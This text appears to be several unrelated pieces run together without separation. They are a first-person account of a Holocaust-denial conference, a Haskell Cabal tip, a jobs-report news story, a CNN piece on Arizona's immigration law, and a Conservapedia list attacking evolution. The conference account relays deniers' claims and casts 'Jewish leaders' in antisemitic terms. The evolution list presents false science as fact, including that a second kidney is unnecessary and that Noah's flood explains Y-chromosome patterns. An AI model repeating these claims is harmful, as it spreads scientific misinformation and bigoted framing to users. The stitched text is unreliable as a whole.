Thirty people on one square meter , three people on one square foot ?
" Impossible , " " Incredible , " " Nonsensical , " wrote the jeering deniers .
" It is feasible if one uses a scrap press , but in that case gassing would be superfluous . "
Even mainstream historians fudged the Confessions ' figures , writing at best inaccurately and at worst unscrupulously of 170 to 180 people or of a hundred square meters .
For forty - five years , no one had troubled himself to see if seven to eight hundred people could fit on twenty - five square meters until Provan , in Monongahela , read these words in the Confessions : " More than half are children . "
Well , if I 've got one thing , thought Provan , it 's children , and he put down the book and took his five children and one big baby doll into an upstairs bedroom .
" What are you doing ? " asked Mrs. Provan .
" An experiment : How many kids can fit in a gas chamber . "
" You should n't use the kids like that .
It 's sorta gruesome . "
" Aw , it wo n't hurt them , " said Provan in his down - home voice , and he had the kids strip to their underwear .
He packed them into a corner , then with two dressers corralled them into a square of sixteen by sixteen inches .
Then , setting them free , he used an electronic calculator to calculate to his astonishment that he could fit 891 children into the gas chamber at Belzec .
Tears came to Provan 's eyes , for he saw the Confessions differently now .
Its author , he saw , would n't say something so impossible , incredible , nonsensical , something no one would believe for a half century , if he himself had n't witnessed it .
Gerstein , the SS man , had seen Jews die at Belzec ( " One hears them weeping , sobbing " ) , and the Holocaust had indeed happened .
Provan did two more experiments even as Mrs. Provan , a sort of Cesare Cremonini -- the colleague of Galileo's who would n't look into Galileo 's telescope -- told him , " You should n't . "
In one , he used five kids , three mannequins , and one doll , and in the other , five kids , three adults -- a printer , a minister , and an Italian woman who said , " You 're nuts , but I 'll do it " -- all with their clothes on , and the doll , and he calculated that seven hundred fathers , mothers , children , and babies would fit in the chamber at Belzec .
And last March , he used the same scientific method on the " No holes ?
No Holocaust ! " hypothesis , going with some of his children ( he had nine by now ) to one collapsed chamber at Auschwitz .
The witnesses there had said the holes were alongside the central columns , and Provan used a forty - dollar metric measuring tape to find where the columns had been and found -- well , whaddya know ? -- those celebrated holes .
No longer were they twenty - five by twenty - five centimeters , as the witnesses had said .
Now , with the roof blown up , they were larger , and Provan photographed them , came home to Monongahela , wrote up a monograph , printed it at his print shop , and printed a cover that , in gold letters , with the exclamation point demoted to a question mark , said , NO HOLES ?
NO HOLOCAUST ?
He then flew to Orange County and appeared at the palm - filled hotel on Saturday afternoon .
Not even washing up , he sat with childlike delight on a flowery lobby love seat by the Kentia palm , handing his two dozen spiral - bound copies to the illuminati of Holocaust denial .
If he expected encomiums , he misunderstood human nature , which clings to established beliefs as though to a life preserver without which we 'd sink to the jet - black depths of the Mindanao Trough .
" You have a bent toward evil , " the chief denier from Australia , a man of German ancestry , told Provan .
" You slander the German people .
You believe in the Holocaust . "
" But Charles , if I may call you Charles , bring me the pudding , " said the chief denier alive , a Frenchman who coined the " No holes ?
No Holocaust ! " motto .
" Bring me the holes of twenty - five by twenty - five centimeters . "
" Oh , I can 't , " said Provan .
" Where do you see a square of twenty - five by twenty - five ? "
" Oh , not anymore .
But this hole is big enough to have held it . "
" But you do n't have a square of twenty - five centimeters . "
" I admit that . "
" This can not convince me , " the Frenchman said .
The angriest denier was David Irving , the British historian who'd said in London that a photograph of a hole would drive such a metaphorical hole in his case that he could n't defend it .
Irving , who is n't allowed at Auschwitz and may have been jealous of an amateur 's access , sat at the open - air downstairs restaurant in front of a Caesar salad .
On spotting Provan , he turned black , and his words came like chisel chips .
" I 'm hopping mad , " Irving said .
" If I were an SS man and somebody said , ' Knock some holes in that ceiling , will you ?
We 're going to start putting cyanide in , ' I 'd make those holes in the middle of some empty area .
I would n't put them -- bang , bang , bang , bang -- next to the load - bearing pillars .
What were the load - bearing pillars for ?
Just cosmetic purposes ? "
Provan , twenty years younger , stood like a boy called down to the principal 's office , looking abashed , and Irving continued , " The Germans spend God knows how many hundreds of thousands of pounds building this ?
And then they allow some jerk with a sledgehammer to punch holes
next to the load - bearing pillars ?
I 'm having lunch , " said Irving abruptly , and he attacked his salad without a whit of his ardent convictions voided by Provan 's photographs .
Of course , the deniers would say it 's Provan and I whose convictions were n't voided by Irving , and it may be a hundred years before we know whose views prevail .
" We have won , " an SS man told Primo Levi at Auschwitz .
" There may be suspicions , but there will be no certainties , because we 'll destroy the evidence together with you . "
Provan , the only speaker ( other than me ) who believed that the Holocaust happened , spoke in the ballroom later on .
He spoke about a Jewish coroner at Auschwitz and not about his " No holes ?
No Holocaust ? " monograph or his one other epoch - making discovery .
In the cyanide chambers at Auschwitz , there are no cyanide stains , and the deniers , though they 've never worn a T - shirt saying NO CYANIDE ?
NOBODY DIED !
call this another proof that what we call cyanide chambers were , in fact , innocuous morgues .
But according to Provan , the chambers have no stains because the Germans painted their walls .
Sixteen other speakers spoke on Saturday , Sunday , and Monday , for this was a holiday weekend , and I counted six who'd run afoul of the law because of their disbelief in the Holocaust and the death apparatus at Auschwitz .
To profess this in anyone 's earshot is illegal not just in Germany but in Holland , Belgium , France , Spain , Switzerland , Austria , Poland , and Israel , where denying the Holocaust can get you five years while denying God can get you just one .
One speaker , David Irving , had been fined $ 18,000 for saying aloud in Germany that one of the cyanide chambers at Auschwitz is a replica built by the Poles after the war .
A replica it truly is , but truth in these matters is no defense in Germany .
Another speaker , a Frenchman , had been fined in France , and another speaker , a German , had been sentenced to fourteen months in Germany but , his landlord evicting him , his wife deserting him , had fled to England .
Another speaker , an Australian , had come from seven months in a German jail for writing in Australia ( alas , on the Internet , which Germans in Germany can read ) that there were no cyanide chambers at Auschwitz .
In his defense , he 'd called an expert witness , but the man could n't testify or he'd be jailed , too , the victim of the selfsame law .
The fifth speaker was a Swiss , a man whom I 'd once roomed with ( I 'd met many deniers previously ) and fed the kangaroos with in South Australia .
He 'll go to jail for three months in Switzerland for questioning the Auschwitz cyanide chambers .
In the United States , thank God , we have the First Amendment .
But even in that shuttered ballroom in California , the sixth speaker could n't say all he wanted to -- could n't , for example , say the Germans did n't kill the Jews deliberately .
A few hours earlier , he and I had debated this at a waffle breakfast , debated it in audible voices with no qualms of being arrested , indicted , or imprisoned by federal marshals .
" But what about Eichmann ? " I 'd asked him .
" He wrote that Hitler ordered the physical destruction of the Jews .
He wrote about Vergasungslager , gassing camps . "
" John .
The man was in Israeli captivity . "
" Well , what about during the war ?
Hans Frank , the governor general of Poland , said to exterminate all the Jews , without exception . "
" He was only quoted as saying that , John . "
" And what about Goebbels ?
He said a barbaric method was being employed against the Jews .
And Himmler ?
He said the SS knew what a hundred , five hundred , one thousand corpses were like . "
" John , I do n't know .
They might have said it , " the sixth speaker told me .
" But it is n't true that genocide was a German national policy . "
A few hours later , the speaker did n't dare repeat this up in the ballroom , for he 's a Canadian citizen and his speech was carried live on the Internet in Canada , and if he said what he'd said over waffles , he'd have been prosecuted in Canada .
Already he'd been tried twice as well as hit , beaten , bombed , engulfed by a $ 400,000 fire , and told , " We 'll cut your testicles off . "
The man 's name is Ernst Zundel .
He 's round - faced and red - faced like in a Hals , he 's eternally jolly , and he was born in Calmbach , Germany .
If you saw the recent movie about the Holocaust deniers , Mr. Death , he 's the man in the hard hat who says , " We Germans will not go down in history as genocidal maniacs .
We. Will . Not . "
He has become a hero to anti-Semites and , like every denier , has been called anti-Semitic himself , but it 's just as honest to say that the Jews who ( along with God ) oversee the Jewish community are in fact anti-Zundelic , anti-Countessic , anti-Irvingic , and , in one word , anti-denieric .
The normal constraints of time , temperance , and truth do not obstruct some Jewish leaders from their nonstop vituperation of Holocaust deniers .
" They 're morally ugly .
They 're morally sick , " said Elie Wiesel on PBS .
They bombard us with disinformation , said Abraham Foxman , the national director of the Anti-Defamation League , on the op - ed page of The New York Times .
" Holocaust deniers , " said Foxman , spreading disinformation himself , " would have [ us ] believe there were no concentration camps . "
Myself , I disagree with these Jewish leaders .
Most deniers , most attendees in their slacks and shorts at the palm - filled hotel , were like Zundel : people who , as Germans , had chosen to comfort themselves with the wishful thinking that none of their countrymen in the 1940s were genocidal maniacs .
I can sympathize with the Germans , for I 've seen a bit of this wishful thinking among some Jews .
Seven years ago , I ruefully reported in my book An Eye for an Eye that thousands of Jews who 'd survived the Holocaust had rounded up Germans and beat , whipped , tortured , and murdered them -- German men , women , children , and babies -- in concentration camps run by Jews .
This little holocaust was corroborated by 60 Minutes and The New York Times but not by Jewish leaders .
They , pardon the expression , denied it , writing reviews whose titles were " The Big Lie " and " False Witness " and " Do Me a Favor -- Do n't Read This Book . "
If Jews feel pressed to deny what happened to sixty thousand Germans , then Jews might forgive the Germans , like Zundel , who choose to deny what happened to six million Jews .
Instead , Jewish leaders hound them .
Astronomers do n't spill rivers of ink denouncing the UFO fanatics , whose theories are much less malignant but whose legions are much more numerous than the dozen dozen deniers at that international conference , their first in six slow - moving years .
But for various reasons ( for reparations , for the survival of Israel , or for real apprehensions that it could happen again ) , Jewish leaders want the Holocaust to be front and center in America 's consciousness .
In this they 've succeeded spectacularly .
Americans who are n't senior citizens think it was partly to save the Jews that we declared war on Germany , though that was no factor at all .
Americans who do n't know if one hundred thousand , two hundred thousand , or one million of our own soldiers died ( and surely do n't know that fifty million people died in China ) know exactly how many Jews died in World War II .
Once , said Michael Berenbaum , the former research director of the U.S. Holocaust Memorial Museum , " the Holocaust was a side story of World War II .
Now one thinks of World War II as a background story [ to ] the Holocaust . "
Among many ways Jewish leaders accomplished this was to tap out an SOS , an all - points alarm , whenever in any dark corner they spotted a knavish denier .
They may have adopted this from Jakob Bohme , a German mystic of Shakespeare 's time .
Bohme once said , " Nothing becomes manifest without opposition , for if it has nothing to oppose it , it slowly moves away from itself and does not return . "
Lest the Holocaust become unmanifest , lest the Holocaust move away from itself , Jewish leaders constantly point to the opposition , the bogeyman , the bugaboo , the otherwise ineffectual squad of Holocaust deniers .
But there 's a double edge to Bohme 's sword :
By opposing , opposing , opposing them in print , on the radio , and on TV , Jewish leaders make the deniers manifest , too .
The deniers survive because they are being persecuted .
They survive to spread their doctrine to the true Jew haters of the world .
My own speech was on Monday afternoon .
It was about An Eye for an Eye , which the Germans among the deniers wanted to hear about so they could share their parents ' guilt with the Jews , their parents ' victims .
No longer did I want to tell the deniers off , but I did want to edify them ( and I did ) that I and the Jews in An Eye for an Eye devoutly believe that the Holocaust happened .
But also I wanted to say something therapeutic , to say something about hate .
At the hotel , I 'd seen none of it , certainly less than I 'd seen when Jews were speaking of Germans .
No one had ever said anything remotely like Elie Wiesel , " Every Jew , somewhere in his being , should set aside a zone of hate -- healthy , virile hate -- for what persists in the Germans , " and no one had said anything like Edgar Bronfman , the president of the World Jewish Congress .
A shocked professor told Bronfman once , " You 're teaching a whole generation to hate thousands of Germans , " and Bronfman replied , " No , I 'm teaching a whole generation to hate millions of Germans . "
Jew hatred like that German hatred , or like the German hatred I saw on every page of Hitler 's Willing Executioners , I saw absolutely none of , but I saw that some people , all Germans , had had to struggle to suppress it .
" The tone of the Jewish establishment , " said Zundel at another breakfast in the airy downstairs restaurant , " is so strident , offensive , grating , so denigrating of Germans , there 's going to be ... "
He stopped short .
" We are so sick of the Holocaust ! " a German woman with us took up .
" Gentiles have it thrown in their faces morning , noon , and night without relief .
Do the Jewish people know that ? "
" They convict us , imprison us , make us into outcasts , " said Zundel , who is now being prosecuted in Canada for , among other things , truthfully saying that Germans did n't make soap out of Jews .
" Teachers lose their jobs .
Professors lose their tenure , and I say this is n't good for the Jewish community . "
" I see dissatisfaction , " said the German woman , " that I shudder about .
I think the Jewish community has to try to lessen it .
This censorship !
This terrorism ! "
In no way did her or Zundel 's jaw get twisted like a twisted rubber band into the outward contours of hate , but the woman 's quivered at the edges somewhat .
So at the lectern in the grand ballroom on Monday , I spoke about hate .
" There are , " I said , " eighty - five thousand books about the Holocaust .
And none has an honest answer to How could the Germans do it ?
The people who gave us Beethoven , the Ninth Symphony , the Ode to Joy , Alle Menschen werden Bruder , all men are brothers .
How could the Germans perpetrate the Holocaust ?
This mystery , we 've got to solve it , or we 'll keep having genocides in Cambodia , Bosnia , Zaire .
Well , " I said , " what I report in An Eye for an Eye is Lola " -- the heroine , the commandant of a terrible prison in Gleiwitz , Germany -- " Lola has solved it .
The Jews have solved it .
Because in their agony , their despair , their insanity , if you will , they felt they became like the Germans -- the Nazis -- themselves .
And if I 'd been there , " I said , " I 'd have become one , too , and now I understand why .
A lot of Jews , understandably , were full of hate in 1945 ; they were volcanoes full of red - hot hate .
They thought if they spit out the hate at the Germans , then they'd be rid of it .
" No , " I continued .
" It does n't work that way .
Let 's say I 'm in love with someone .
I do n't tell myself , Uh - oh , I 've got inside of me two pounds of love , and if I love her and love her , then I 'll use all of my love up -- I 'll be all out of love .
No , I understand and we all understand that love is a paradoxical thing , that the more we send out , the more we 've got .
So why do n't we understand that about hate ?
If we hate , and we act on that hate , then we hate even more later on .
If we spit out a drop of hate , we stimulate the saliva glands and we produce a drop and a quarter of it .
If we spit that out , we produce a drop and a half , then two drops , three , a teaspoon , tablespoon , a Mount Saint Helens .
The more we send out , the more we 've got , until we are perpetual - motion machines , sending out hate and hate until we 've created a holocaust . "
I then said emphatically , " You do n't have to be a German to become like that .
You can be a Serb , a Hutu , a Jew -- you can be an American .
We were the ones in the Philippines .
We were the ones in Vietnam .
We were the ones in Washington , D.C. , for ten thousand years the home of the Anacostia Indians .
They had one of their campgrounds at what now is the United States Holocaust Memorial Museum .
" We all have it in us to become like Nazis , " I said .
" Hate , as Lola discovered , is a muscle , and if we want to be monsters , all we have to do is exercise it .
To hate the Germans , to hate the Arabs , to hate the Jews .
The longer we exercise it , the bigger it gets , as if every day we curl forty pounds and , far from being worn out , in time we are curling fifty , sixty , we are the Mr. Universe of Hate , the Heinrich Himmler .
We all can be hate - full people , hateful people .
We can destroy the people we hate , maybe , but we surely destroy ourselves . "
The people who say the Holocaust did n't happen applauded .
Loud and long they applauded , and a number of German deniers stood up .
Some asked questions about Auschwitz , like why did I think that Germans meant for Jews to die ?
But one from Berlin , named Wolfgang , later confessed to me , " I believe that Auschwitz became unsanitary .
The Jews were worked very hard , I grant you that .
They died .
And they had to be gotten rid of .
And after they died , the SS put them into crematoriums .
I wo n't deny that .
And maybe to scare some , the SS told them , ' You 're next , you 're going to go up in smoke . '
And maybe ... "
The conference ended on Monday .
No one was ever attacked by the Jewish Defense League .
The deniers ( revisionists , they call themselves ) meet next in Cincinnati , and they have invited me to be the keynote speaker there .
I 've said yes .

A short public service announcement : you might think you do n't need Cabal .
Oh , you might be just whipping up a tiny throw - away script , or a small application that you never intend on distributing .
Cabal ?
Is n't that what you do if you 're planning on sticking your package on Hackage ?
But the Cabal always knows .
The Cabal is always there .
And you should embrace the Cabal , even if you think you 're too small to care .
Here 's why :
Writing a cabal file forces you to document what modules and what versions your script worked with when you were originally writing it .
If you ever decide you want to run or build your script on another environment , the cabal file will make it dramatically easier to get your dependencies and get running faster .
If you ever update your modules , the cabal file will partially insulate you against API changes ( assuming that the package follows Hackage 's PVP ) .
This is far more palatable than GHC 's package - qualified imports .
You might have cringed about writing up a Makefile or ant file to build your projects in another language ; as long as it is just one or two files , the pain associated with these build languages seems to outweight the cost of just running gcc foo .c -o foo .
Cabal files are drop - dead easy to write .
There even is a cabal init to do the scaffolding for you .
Toss out the dinky shell script that you 've kept to run ghc -- make and use cabal configure && cabal build .
It gives you nice things , for free !
Do you want Haddock documentation ?
A traditional GNU - style Makefile ?
Colourised code ?
Cabal can do all of these things for you , with minimal effort after you have your cabal file .
“ I think at this point the U.S. economy has a very good chance of being able to continue its recovery despite the uncertainty in Europe , ” said Bernard Baumohl , chief global economist at the Economic Outlook Group .
“ But the threat is real , and we have to be vigilant and very nimble . ”
President Obama called April ’s job report “ particularly heartening . ”
He noted that “ this week ’s job numbers come as a relief to Americans who ’ve found a job , but it offers , obviously , little comfort to those who are still out of work . ”
All manner of businesses were hiring , including those in manufacturing , leisure and hospitality and health care .
One of the strongest gains occurred in manufacturing , which added 44,000 jobs , the largest increase since 1998 .
The Census Bureau contributed 66,000 temporary jobs last month .
Yet , in a sign that many people will struggle to find a job even as the economy improves , the number of people who have been out of work for more than six months hit 6.7 million , nearly 46 percent of the unemployed .
“ The economic recovery and expansion is entrenched , sustained and sustainable , ” Allen L. Sinai , chief global economist at Decision Economics , said .
But he warned that the economy faced numerous challenges , including the need for the United States to deal with its own domestic debt and a possible downturn in exports to Europe .
“ It ’s like having symptoms of a heart attack , ” Mr. Sinai said , “ either you ignore them or take preventive action to make sure there will be no heart attack . ”
The increase in April was accompanied by a revised gain for March of 230,000 jobs , up from 162,000 .
While the levels of the last two months exceeded the 150,000 jobs a month that many economists say is necessary to accommodate new entrants to the job market , they were still not nearly as high as the average after previous recessions .

The number of unemployed people actually rose slightly from March , to 15.3 million .
And the so - called underemployment rate — which includes people whose hours have been cut as well as those working part time because they cannot find full - time jobs — rose to 17.1 percent , from 16.9 percent in March .
Phoenix , Arizona ( CNN ) --
Sue Schwartz says she 's been called a racist so many times she does n't mind the label anymore .
If wanting immigrants to enter the country legally , like her great - grandparents from Mexico , and obey the laws of the land makes her racist , then so be it , she says firmly .
" I 'm getting to the point I wear it with pride , " says Schwartz , a lifelong Arizonan who has warily watched the growth of the illegal immigrant population in the state over the course of her life .
About 500,000 unauthorized immigrants were believed to live in Arizona in 2008 , and 11.9 million nationwide , up from 3.5 million nationwide in 1990 , according to a Pew Hispanic Center report published in 2009 .
This year , the tide is finally turning in her favor , she says , with the passage of SB 1070 , aimed at cracking down on illegal immigration .
The new law requires immigrants to carry their alien registration documents at all times and requires police to question people if there is reason to suspect they 're in the United States illegally .
Read the full text of Senate Bill 1070 ( PDF )
" I hope it makes a lot of them leave on their own , self - deportation .
Hopefully that 'll open up more jobs .
There 's a lot of people here who will do menial jobs -- maybe not pick lettuce , but these people are n't just picking lettuce any more , " says Schwartz .
The new law also targets those who hire illegal immigrant day laborers or knowingly transport them .
What will Arizona immigration law do ?
Schwartz , a retired USPS worker , says undocumented workers are taking jobs from citizens like her teenage granddaughter , who has n't been able to find a job since she began looking after she turned 15 .
" She can't even work at the Hometown Buffet if she does n't speak Spanish .
How fair is that ? " she said .
But Schwartz and some other Americans with Hispanic backgrounds who spoke with CNN say the problem with illegal immigrants is n't just the jobs they take .
It 's how they 're overrunning towns like Phoenix , turning them into " mini-Mexicos " with their trash - filled streets and loud music , according to Schwartz .
Of equal concern to her friend , Martha Payan , is how she claims illegal immigrants " fleece " government coffers by collecting welfare on multiple children , or vanish without a trace after an arrest or a hospital visit .
The two women , who became acquainted through various demonstrations in the metro Phoenix area , met Thursday to discuss their views outside the Maricopa County Municipal building , as more backlash against the controversial immigration law continued to flood the city .
Latin pop star Shakira arrived in town Thursday to discuss SB 1070 with Mayor Phil Gordon , who has vowed to fight the law .
This comes a day after Mexico urged its citizens not to travel to Arizona .
Sporting a white baseball cap that that reads , " 100 % American Citizen , " Schwartz says she believes that SB 1070 came about because law enforcement in Phoenix was fed up over not being able to ask suspects about their immigration status .
" Any time an American does something wrong or breaks the law they 're going to pay the consequences .
Whenever an illegal does something wrong they get a new ID and become a new person , " she says .
" I want the laws same for everybody here , not bent for them . "
The 59 - year - old mother of four adult children says her Mexican parents and grandparents taught her a respect for the law at an early age .
Her grandmother , who lived in Juarez , Mexico , after being kicked out of the United States for smuggling drugs , encouraged her to get a good education and speak English , her second language , outside of the home .
" If I entered another country illegally I 'd go to jail , yet they 're demanding better treatment than their government would give us , " she says .
i Report : Share your thoughts on immigration policy
Anna Gaines , a Mexican - born U.S. citizen , says she took up the fight against illegal immigration after becoming disillusioned by the attitudes of immigrant families that she witnessed as a teacher in the Paradise Valley School District in Paradise , Arizona .
" Many of these families were having one child after another just to earn a paycheck from the U.S. government and they did n't care about their children 's education , " says Gaines , the controversial founder of American Citizens United , a grass - roots organization known for its extreme views on immigration enforcement .
" They did n't want to contribute , just take . "
Gaines , who came to the United States as a nurse on a work visa during the Vietnam War and met her current husband , says she thinks immigrants have changed over the years .
" There used to be a level of dignity and self - respect .
They were hard - working people who wanted to contribute to American society because it was better than where they came from , " says Gaines , a petite woman in her 70s .
" But our government has been giving them handouts for so long that now they expect them . "
Gaines says SB 1070 mirrors federal law on fortifying the borders , allowing local officials to enforce immigration law in a manner that the federal government should have been doing all along .
" We as Americans have the right to defend this country 's laws .
There 's nothing racist about protecting the country , " she says .
Payan , originally from Puerto Rico , hopes the law will deter future illegal immigration .
" I hope it stops trespassers and lets people know the law is the law and you cross that border illegally , it 's a crime , " she says .
Payan has also been called " traidora , " or traitor , by neighbors in her primarily Hispanic neighborhood who know how she feels about illegal immigrants .
" They know how I feel .
I do n't hide my feeling , " she says .
" I 've already had by apartment broken into and had my car hit by an illegal .
What more do I have to lose ? "
From Conservapedia
The theory of evolution does not permit the existence of any counterexamples .
If any one of the 52 counterexamples listed below is correct , then the theory of evolution fails .
Moreover , even if there is merely a 10 % chance that each of these counterexamples is correct ( and the odds are far higher than that [ 2 ] ) , then the probability that the theory of evolution is true is less than 1 % .
Counterexamples
Logical examples
Lack of mechanism
[ 12 ] Harvard biologist Ernst Mayr wrote : " It must be admitted , however , that it is a considerable strain on one ’s credulity to assume that finely balanced systems such as certain sense organs ( the eye of vertebrates , or the bird ’s feather ) could be improved by random mutations . "
The extraordinary migration patterns of butterflies and birds cannot be explained through naturalistic development , and lack any plausible materialistic explanation . [ 13 ]
Evolution does not account for the immense amount of information in the genome .
While there are various definitions of information , and many types have been observed to occur naturally , DNA contains information that is processed to lead to a result predetermined by the content of that information .
Strictly speaking it is inaccurate to refer to DNA as a " code " or " language , " as many scientists are prone to doing .
In fact DNA is more like a template , which produces messenger RNA ( mRNA , ) a new template with more appropriate bases for protein production .
The mRNA essentially acts as a scaffold to which the appropriate amino acids attach to form a protein molecule .
Rather than being a language containing words which each have a meaning , DNA is more like a jig or framework which allows a specific molecule of mRNA , and subsequently a specific protein sequence , to be assembled on it .
In effect the information is the sequence of chemical reactions which that length of DNA will catalyse .
Given the huge number of useless protein molecules which could be formed and the complexity of even a simple protein such as haemoglobin , this sequence could not have evolved by natural selection as the odds against the initial organism having a functional protein are too great .
The development of feathers , which could not have conceivably " grown " from the scales of reptiles or any other known structure . [ 14 ] [ 15 ]

The beauty of God 's creation , such as autumn foliage , cannot adequately be explained through the evolutionary paradigm .
See : Argument from beauty Humans exhibit behaviors such as performing science , creating art and music , dancing , and a number of other intellectual and artistic behaviors which could not have been produced by random mutations .
There is no known evolutionary reason why these should be favored .
Trematode parasites , like many other kinds , lack a plausible evolutionary phylogeny , though they can easily be explained by a teleological design . [ 16 ]
Evolution cannot explain the many complex sex- determining systems .
For example , in most mammals , females have two identical sex chromosomes ( XX in this case ) whereas males two different ones ( XY . )
However in birds , reptiles , many insects , and other organisms , the situation is reversed to where the male has two identical sex chromosomes and the female has two different ones ; for example male birds have a ZZ chromosome pair and females ZW .
No evolutionist has proposed a mechanism by which mammals could have a different sex chromosome system from the reptile ancestors they allegedly share with birds .
As alluded to above , evolution requires that random mutations cause one kind to change into another , but this has never been observed .
The existence of two symmetrical kidneys , which are unnecessary in most people , lacks a plausible evolutionary explanation based on functionality alone .
Because evolution falsehoods mislead most people into thinking they need their second kidney , " the average waiting time for the organs from a deceased donor in the United States is five years " and " 3,916 patients waiting for a kidney in 2006 died before one became available . " [ 17 ]
Thousands of years of intense selective breeding should have produced a new wolf species from domesticated dogs , yet dogs and wolves remain the same species .
Maladaptation
Inability to account for widely observed altruism among animals , as it reduces an animal 's ability to survive .
“ The existence of altruism between different species — which is not uncommon — remains an obstinate enigma . ” [ 18 ]
Not surprisingly , many atheist evolutionists have done their utmost to deny animal altruism .
The gradual buildup of deleterious mutations in an organism 's genome as the species grows older limits the maximum lifespan of a species well under what would be required for evolution .
Each generation of humans has far more negative mutations than the posited natural selection can remove .
Evolution is thus impossible as species would become nonviable long before they could diverge . [ 19 ]
Wrong predictions
Lack of any demonstrable vestigial parts of the human genome .
While evolutionists often claim that regions of the genome are " junk DNA " and would not have been placed there by a designer , none have actually shown this to be true , and much so - called " junk DNA " has been shown to be useful . [ 21 ]
While evolutionists argue that there are examples of " bad design " in the bodies of many organisms , such as " flaws " in the human spine and sinus system , evolutionists fail to realize that , by their own theory , natural selection should have removed these things !
The simpler explanation , that these represent degeneration from an original , created perfect form , is the superior one .
In other words , as CreationWiki notes , such " flaws " are actually " a result of deterioration , resulting from Man's Fall . " [ 22 ]
We have the perfect number of teeth to fit in our mouths .
While creationism perfectly accounts for that result , evolutionism predicts a contrary result :
As our faces evolved from chimpanzee - like faces to human faces , the shortening of the muzzle would have caused the teeth to become badly overcrowded in the front of the mouth .
Human fertility is rapidly declining , disproving evolutionary improvement in humans and also suggesting a brief timeline for human existence .
Evolutionist theory predicts that in the case of convergent evolution , a particular structure such as an eye that evolves in an optimal form in one species can later evolve in a suboptimal form in a different species .
No such result has ever been observed .
Constantly mutating , drug - resistant pathogens such as MRSA have been demonstrated to be the result of devolution rather than evolution . [ 23 ]
This is the exact opposite of what evolutionary theory predicts .
Missing fossils
The remarkable whale , which is a mammal , has no plausible evolutionary ancestor .
" There ’s a frustrating lack of fossil evidence from the period when insect flight [ supposedly ] evolved , " which was " long before birds , bats or pterosaurs . " [ 24 ]
No transitional forms appear for horses , instead different and distinct horse - like animals appear in the fossil record . [ 25 ]
The enormous gaps and lack of intermediate forms in the fossil record , once all the frauds are removed .
Mammalian fur and body hair .
There is no known evolutionary pathway for the development of fur , and no fossil evidence of hair evolving from scales , even though it survives very well . [ 26 ]
Irreducible Complexity
The extraordinarily long neck of the giraffe .
The giraffe 's heart creates immense pressure to drive blood up the neck to the brain .
Because of this there are valves in the neck which automatically restrict the blood flow when the giraffe lowers its head to drink .
Without these valves the sudden increase in blood pressure as the heart no longer needs to overcome gravity would rupture the arteries in the brain and kill the giraffe .
However the giraffe could not have evolved a long neck without the valves and had no need to evolve the valves unless it had a long neck .
The okapi , which evolutionists claim is the closest relative of the giraffe , has no such valves .
Evolutionary theory cannot explain this . [ 27 ]
Bacterial Flagellum with rotary motor , courtesy of Access Research Network ( Art Battson )
The development of wings in birds , as intermediary wing stubs would have no use , and be a competitive disadvantage .
The flagellum of certain bacteria contain a multi-part cellular motor which fails to function if a single part is removed .
This is the classic example of irreducible complexity as publicised by Professor Michael Behe . [ 28 ]
Because the flagellum must have all its parts to function it could not have evolved and therefore must have been designed by an intelligent being .
At the Kitzmiller vs. Dover Area School District trial , Professor Ken Miller attempted to rebut this argument by pointing out that if 42 parts of the flagellum are removed what remains is a fully functional Type III Secretory System , used by some bacteria to inject toxins into target cells .
While Miller 's claim is factually accurate , it fails to explain how the T3SS could simultaneously add 42 parts to create a working flagellum .
The organ and brain development required for retinal imagery require a base level of complexity , making a primitive form useless and impossible under evolution . [ 29 ]
The ear contains three tiny bones that transmit sound waves from the eardrum to the cochlea . [ 30 ]
Because of the complicated arrangement of those bones , transitional forms ( which have never been found ) would have served no purpose .
Evolutionists claim that these bones used to form part of the reptilian jaw joint , but no intermediate fossil with half jaw / half ear has ever been found , and there is no way evolutionism can explain how a jaw becomes an ear .
Bony skeletons represent an example of irreducible complexity , since only a fully formed , complete skeleton is of any use whatsoever , while having only one or some few number of bones in an otherwise invertebrate creature is hardly advantageous .
It is inconceivable to think that some random mutation could have resulted in the formation of an entire bone system in a creature which was previously invertebrate .
" Social insects " such as bees , ants , and termites , which have extremely complex caste systems .
Where an insect fits into the system is determined by its diet when young .
Evolution requires that the genes for the various castes and the genes for caste - specific behavior all appeared simultaneously .
Akin to the concept of irreducible complexity , but on a higher ( social ) order , this is impossible given random chance .
The complex social structure of these insects is evidence of intelligent design ; also , since the overwhelming majority of individuals are workers and do not reproduce , they do not perpetuate their genetic material , as evolutionism claims all living things must do .
Lungs never would have had to develop unless the animal was already on land , in which case , they would die before reproducing .
There is no explanation within the theory of evolution through natural selection for the mechanism in which a catapillar turns into a butterfly .
Essentially the original animal is broken down and rearranged into a totally different animal , with no similar physical characteristics .
This process cannot be explained within the theory , and points to a designer 's involvement .
The whale is an extraordinarily unique sea - based mammal ( see diagram above right ) , which has no plausible evolutionary ancestor .
Uncategorized
Evolution would result in modern languages having one common ancestral language , and for nearly a century linguists insisted that there must be one .
There is not , and linguists now accept that there are completely independent families of languages .
No other animal exhibits religion .
A far better explanation than random mutations is that humans were given the capacity to be religious by a loving God who wants a relationship with His creations .
Circadian phenomena — internal 24 - hour clock mechanisms of humans and other living beings — defy material explanation .
Examples include how some people are unable to change the timing of their need for sleep for each day , and how plants exhibit clock - like behavior regardless of their exposure to sunlight .
In addition , there is a weekly clock cycle for many phenomena , which has a clear biblical basis but defies any materialistic explanation . [ 31 ]
Scientists have found proof that the first chicken came before the first egg , [ 32 ] consistent with a special creation of chickens but not with a gradual descent with modifications from a proto- chicken and proto-egg .
Despite the large ( and ever increasing ) number of breeds of dogs , and the fact that some purebred lineages of dogs are reproductively isolated from other dogs , no new species of dog has evolved . [ 33 ]
Even evolutionist studies have shown ( despite the dating errors ) that the vast majority of species on Earth arose around the same time and that genetic boundaries exist between the various animal kinds . [ 34 ]
Evolutionist studies have found that all male humans have the same Y - chromosome while females have greater chromosomal diversity . [ 35 ]
This is in line with the Genesis account , which shows that only Noah 's Y - chromosome lineage survived the flood , being passed along to his sons and beyond , while seven or eight x-chromosome lineages survived . [ 36 ]

Since World War II a majority of the most prominent and vocal defenders of the theory of evolution which employs methodological naturalism have been atheists . [ 37 ]
In 2011 , a campaign called the Question evolution !
campaign was launched by the biblical creation organization Creation Ministries International which is a worldwide " grass - roots movement to challenge the anti-Christian dogma of evolution " . [ 38 ]

campaign is on " 15 questions that evolutionists cannot satisfactorily answer . " [ 39 ]
The 15 questions posed to evolutionists ( and undecided individuals ) can be found HERE
Logical Conclusion
As scientific theories require that their laws be immutable , the existence of merely one counterexample disproves the truth of the rule .
Thus , if evolution fails to account for any one of these items ( or countless others ) , it must be discarded .

